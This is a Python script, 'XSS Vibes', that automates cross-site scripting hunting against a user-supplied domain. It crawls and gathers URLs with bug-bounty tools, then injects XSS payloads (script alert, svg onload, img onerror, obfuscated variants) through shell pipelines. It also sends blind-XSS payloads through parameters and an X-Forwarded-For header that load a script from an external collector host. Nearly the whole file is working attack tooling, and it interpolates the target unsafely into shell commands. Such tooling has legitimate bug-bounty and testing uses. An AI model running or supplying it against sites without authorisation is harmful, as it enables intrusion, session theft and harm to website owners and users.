#!/usr/bin/env python3
"""
XSS Vibes - Automated XSS Hunting with OneLiners
Integrates popular bug bounty hunting oneliners with our advanced payloads
"""
import subprocess
import os
import json
import time
from typing import List, Dict
import concurrent.futures
from pathlib import Path


class XSSHuntingAutomation:
    """Automated XSS hunting using popular oneliners from bug bounty community"""

    def __init__(self):
        self.results_dir = "xss_hunting_results"
        self.ensure_results_dir()
        self.tools = self.check_required_tools()

    def ensure_results_dir(self):
        """Create results directory if it doesn't exist"""
        Path(self.results_dir).mkdir(exist_ok=True)

    def check_required_tools(self) -> Dict[str, bool]:
        """Check which tools are installed"""
        tools = {
            "subfinder": self.check_tool("subfinder"),
            "httpx": self.check_tool("httpx"),
            "gospider": self.check_tool("gospider"),
            "waybackurls": self.check_tool("waybackurls"),
            "gau": self.check_tool("gau"),
            "qsreplace": self.check_tool("qsreplace"),
            "dalfox": self.check_tool("dalfox"),
            "kxss": self.check_tool("kxss"),
            "gf": self.check_tool("gf"),
            "hakrawler": self.check_tool("hakrawler"),
            "anew": self.check_tool("anew"),
            "uro": self.check_tool("uro"),
            "freq": self.check_tool("freq"),
            "nuclei": self.check_tool("nuclei"),
            "curl": self.check_tool("curl"),
            "grep": self.check_tool("grep"),
            "awk": self.check_tool("awk"),
            "sed": self.check_tool("sed"),
        }
        return tools

    def check_tool(self, tool: str) -> bool:
        """Check if a tool is installed"""
        try:
            subprocess.run([tool, "--help"], capture_output=True, timeout=5)
            return True
        except:
            return False

    def print_tool_status(self):
        """Print status of required tools"""
        print("🔧 Tool Availability Check:")
        print("=" * 50)
        for tool, available in self.tools.items():
            status = "✅" if available else "❌"
            print(f"{status} {tool}")
        print()

    def gospider_xss_hunt(self, target: str, output_file: str = "gospider_xss.txt"):
        """XSS hunting using gospider - multiple techniques"""
        if not self.tools["gospider"]:
            print("❌ gospider not available")
            return

        print(f"🕷️ Running gospider XSS hunt on {target}")

        # Technique 1: Basic gospider + qsreplace + dalfox
        cmd1 = f"""gospider -s "{target}" -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{{print $5}}'| grep "=" | qsreplace -a | dalfox pipe -o {self.results_dir}/gospider_dalfox_{output_file}"""

        # Technique 2: gospider + SVG payload
        cmd2 = f"""gospider -a -s {target} -t 3 -c 100 | tr " " "\\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>' > {self.results_dir}/gospider_svg_{output_file}"""

        # Technique 3: gospider + script alert
        cmd3 = f"""gospider -S {target} -t 3 -c 100 | tr " " "\\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '"><script>alert(1)</script>' | while read host; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host Vulnerable"; done > {self.results_dir}/gospider_vulnerable_{output_file}"""

        commands = [cmd1, cmd2, cmd3]
        for i, cmd in enumerate(commands, 1):
            print(f"🎯 Running gospider technique {i}/3...")
            try:
                subprocess.run(cmd, shell=True, timeout=300)
            except subprocess.TimeoutExpired:
                print(f"⏰ Technique {i} timed out")

    def wayback_xss_hunt(self, target: str, output_file: str = "wayback_xss.txt"):
        """XSS hunting using waybackurls"""
        if not self.tools["waybackurls"]:
            print("❌ waybackurls not available")
            return

        print(f"🏛️ Running wayback XSS hunt on {target}")

        # Technique 1: wayback + kxss
        cmd1 = f"echo {target} | waybackurls | kxss > {self.results_dir}/wayback_kxss_{output_file}"

        # Technique 2: wayback + gf + qsreplace
        cmd2 = f'echo "http://{target}/" | waybackurls | httpx -silent -timeout 2 -threads 100 | gf xss > {self.results_dir}/wayback_gf_{output_file}'

        # Technique 3: wayback + direct testing
        cmd3 = f"""waybackurls {target} | grep '=' | qsreplace '"><script>alert(1)</script>' | while read host; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host Vulnerable"; done > {self.results_dir}/wayback_vulnerable_{output_file}"""

        # Technique 4: wayback + freq analysis
        cmd4 = f"echo http://{target} | waybackurls | gf xss | uro | qsreplace '\"><img src=x onerror=alert(1);>' | freq > {self.results_dir}/wayback_freq_{output_file}"

        commands = [cmd1, cmd2, cmd3, cmd4]
        for i, cmd in enumerate(commands, 1):
            print(f"🎯 Running wayback technique {i}/4...")
            try:
                subprocess.run(cmd, shell=True, timeout=300)
            except subprocess.TimeoutExpired:
                print(f"⏰ Technique {i} timed out")

    def hakrawler_xss_hunt(self, target: str, output_file: str = "hakrawler_xss.txt"):
        """XSS hunting using hakrawler"""
        if not self.tools["hakrawler"]:
            print("❌ hakrawler not available")
            return

        print(f"🕸️ Running hakrawler XSS hunt on {target}")

        # Advanced hakrawler technique
        cmd = f"""hakrawler -url "{target}" -plain -usewayback -wayback | grep "{target}" | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace -a | kxss | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | dalfox pipe -b https://your.xss.ht > {self.results_dir}/hakrawler_{output_file}"""

        try:
            subprocess.run(cmd, shell=True, timeout=300)
        except subprocess.TimeoutExpired:
            print("⏰ hakrawler technique timed out")

    def gau_xss_hunt(self, target: str, output_file: str = "gau_xss.txt"):
        """XSS hunting using gau (GetAllUrls)"""
        if not self.tools["gau"]:
            print("❌ gau not available")
            return

        print(f"🌐 Running gau XSS hunt on {target}")

        # Technique 1: gau + gf + dalfox
        cmd1 = f'echo {target} | gau | gf xss | sed "s/=.*/=/" | sed "s/URL: //" | tee {self.results_dir}/gau_targets_{output_file} | dalfox file {self.results_dir}/gau_targets_{output_file} -o {self.results_dir}/gau_dalfox_{output_file}'

        # Technique 2: gau + hidden params from JavaScript
        cmd2 = f"""gau {target} | egrep -v '(.css|.svg)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,var,'"$url"?,g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\\e[1;33m$url\\n\\e[1;32m$vars"; done > {self.results_dir}/gau_hidden_params_{output_file}"""

        # Technique 3: gau + BXSS
        cmd3 = f"""gau {target} | grep "&" | head -20 > {self.results_dir}/gau_params_{output_file}"""

        commands = [cmd1, cmd2, cmd3]
        for i, cmd in enumerate(commands, 1):
            print(f"🎯 Running gau technique {i}/3...")
            try:
                subprocess.run(cmd, shell=True, timeout=300)
            except subprocess.TimeoutExpired:
                print(f"⏰ Technique {i} timed out")

    def httpx_xss_hunt(self, targets_file: str, output_file: str = "httpx_xss.txt"):
        """XSS hunting using httpx pipeline"""
        if not self.tools["httpx"]:
            print("❌ httpx not available")
            return

        print(f"🌍 Running httpx XSS hunt on targets from {targets_file}")

        # Advanced httpx pipeline technique
        cmd = f"""httpx -l {targets_file} -silent -no-color -threads 300 -location 301,302 | awk '{{print $2}}' | grep -Eo "(http|https)://[^/"].* | tr -d '[]' | anew | xargs -I@ sh -c 'gospider -d 0 -s @' | tr ' ' '\\n' | grep -Eo '(http|https)://[^/"].*' | grep "=" | qsreplace "<svg onload=alert(1)>" > {self.results_dir}/httpx_{output_file}"""

        try:
            subprocess.run(cmd, shell=True, timeout=600)
        except subprocess.TimeoutExpired:
            print("⏰ httpx technique timed out")

    def comprehensive_xss_hunt(self, target: str):
        """Run comprehensive XSS hunting using all available techniques"""
        print(f"🚀 Starting comprehensive XSS hunt on {target}")
        print("=" * 60)

        # Create target-specific directory
        target_dir = (
            f"{self.results_dir}/{target.replace('://', '_').replace('/', '_')}"
        )
        Path(target_dir).mkdir(exist_ok=True)

        techniques = [
            (
                "gospider",
                lambda: self.gospider_xss_hunt(
                    target, f"{target_dir}/gospider_results.txt"
                ),
            ),
            (
                "wayback",
                lambda: self.wayback_xss_hunt(
                    target, f"{target_dir}/wayback_results.txt"
                ),
            ),
            (
                "hakrawler",
                lambda: self.hakrawler_xss_hunt(
                    target, f"{target_dir}/hakrawler_results.txt"
                ),
            ),
            ("gau", lambda: self.gau_xss_hunt(target, f"{target_dir}/gau_results.txt")),
        ]

        # Run techniques in parallel
        with concurrent.futures.ThreadPoolExecutor(max_workers=4) as executor:
            futures = []
            for name, func in techniques:
                if self.tools.get(name.split("_")[0], False):
                    futures.append(executor.submit(func))
                else:
                    print(f"⏭️ Skipping {name} - tool not available")

            # Wait for all to complete
            concurrent.futures.wait(futures, timeout=1200)  # 20 minutes max

        print(f"✅ Comprehensive hunt completed for {target}")
        self.summarize_results(target_dir)

    def summarize_results(self, target_dir: str):
        """Summarize hunting results"""
        print(f"\n📊 Results Summary for {target_dir}:")
        print("-" * 40)

        result_files = list(Path(target_dir).glob("*.txt"))
        total_findings = 0

        for file in result_files:
            try:
                with open(file, "r") as f:
                    lines = len(f.readlines())
                    total_findings += lines
                    print(f"📄 {file.name}: {lines} entries")
            except:
                print(f"📄 {file.name}: Could not read")

        print(f"\n🎯 Total findings: {total_findings}")
        print(f"📁 Results saved in: {target_dir}")

    def integrate_with_xss_vibes(self, target: str):
        """Integrate findings with XSS Vibes advanced payloads"""
        print(f"🔥 Integrating with XSS Vibes advanced payloads...")

        # Load our advanced payloads
        try:
            with open("payloads.json", "r") as f:
                advanced_payloads = json.load(f)

            print(f"💀 Loaded {len(advanced_payloads)} advanced XSS payloads")

            # Create integration command
            integration_cmd = f"""
            # Test with our GOD TIER payloads
            echo {target} | gau | grep "=" | head -10 | while read url; do
                echo "Testing $url with advanced payloads..."
                # Test cuneiform payload
                curl -s "${{url//=*/=}}𒀀='',𒉺=!𒀀+𒀀" | grep -q "𒀀" && echo "🏺 Cuneiform XSS possible: $url"
                # Test SVG payload  
                curl -s "${{url//=*/=}}<svg onload=alert(1)>" | grep -q "svg" && echo "🎨 SVG XSS possible: $url"
                # Test zero-width payload
                curl -s "${{url//=*/=}}ale‌rt(1)" | grep -q "ale" && echo "👻 Zero-width XSS possible: $url"
            done > {self.results_dir}/xss_vibes_integration.txt
            """

            subprocess.run(integration_cmd, shell=True, timeout=300)
            print("✅ Integration with XSS Vibes completed")

        except Exception as e:
            print(f"❌ Integration failed: {e}")

    def run_nuclei_xss_scan(self, target: str):
        """Run nuclei XSS templates"""
        if not self.tools["nuclei"]:
            print("❌ nuclei not available")
            return

        print(f"⚛️ Running nuclei XSS scan on {target}")

        cmd = f"echo {target} | httpx -silent | nuclei -t ~/nuclei-templates/vulnerabilities/xss/ -o {self.results_dir}/nuclei_xss_results.txt"

        try:
            subprocess.run(cmd, shell=True, timeout=600)
            print("✅ Nuclei XSS scan completed")
        except subprocess.TimeoutExpired:
            print("⏰ Nuclei scan timed out")

    def run_blind_xss_hunt(self, target: str, xss_hunter_domain: str = "your.xss.ht"):
        """Run blind XSS hunting techniques"""
        print(f"👁️ Running blind XSS hunt on {target}")

        # BXSS in parameters
        cmd1 = f"""gau {target} | grep "&" | head -20 | while read url; do curl -s "$url" -d 'test="><script src=https://{xss_hunter_domain}></script>' | grep -q "script" && echo "BXSS possible: $url"; done > {self.results_dir}/blind_xss_params.txt"""

        # BXSS in headers
        cmd2 = f"""echo {target} | httpx -silent | while read url; do curl -s -L "$url" -H 'X-Forwarded-For: "><script src=https://{xss_hunter_domain}></script>' | grep -q "script" && echo "BXSS header possible: $url"; done > {self.results_dir}/blind_xss_headers.txt"""

        commands = [cmd1, cmd2]
        for i, cmd in enumerate(commands, 1):
            print(f"🎯 Running blind XSS technique {i}/2...")
            try:
                subprocess.run(cmd, shell=True, timeout=300)
            except subprocess.TimeoutExpired:
                print(f"⏰ Blind XSS technique {i} timed out")


def main():
    """Main hunting function"""
    print("🔥 XSS Vibes - Automated XSS Hunting")
    print("=" * 60)

    hunter = XSSHuntingAutomation()
    hunter.print_tool_status()

    # Example usage
    target = input("🎯 Enter target domain (e.g., example.com): ").strip()
    if not target:
        target = "testphp.vulnweb.com"  # Default test target

    print(f"\n🚀 Starting hunt on: {target}")

    # Run comprehensive hunt
    hunter.comprehensive_xss_hunt(target)

    # Run additional scans
    hunter.integrate_with_xss_vibes(target)
    hunter.run_nuclei_xss_scan(target)
    hunter.run_blind_xss_hunt(target)

    print("\n🏆 XSS hunting completed!")
    print(f"📁 Check results in: {hunter.results_dir}/")


if __name__ == "__main__":
    main()
